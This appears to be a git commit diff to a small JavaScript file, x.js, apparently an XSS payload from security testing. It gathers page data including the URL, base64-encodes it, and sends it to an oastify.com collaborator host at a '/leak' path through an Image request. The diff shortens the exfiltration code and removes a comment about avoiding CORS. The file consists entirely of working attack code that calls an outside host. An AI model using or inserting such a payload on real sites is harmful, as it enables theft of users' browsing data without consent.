bd49e149d3c12d0c58d15341ee20cfd4486c780c
AmirWilayah <119005771+AmirWilayah@users.noreply.github.com>
2025-07-08 01:04:23 +0800

    x.js

--- x.js
+++ x.js
@@ -4,7 +4,4 @@ const data = {
   url: location.href
 };
 
-const encoded = btoa(JSON.stringify(data));
-
-// Leak using Image to avoid CORS error
-new Image().src = "https://ebt4xhwz0ffgihdddc7oqtkympsgg84x.oastify.com/leak?" + encoded;
+new Image().src = "https://ebt4xhwz0ffgihdddc7oqtkympsgg84x.oastify.com/leak?" + btoa(JSON.stringify(data));
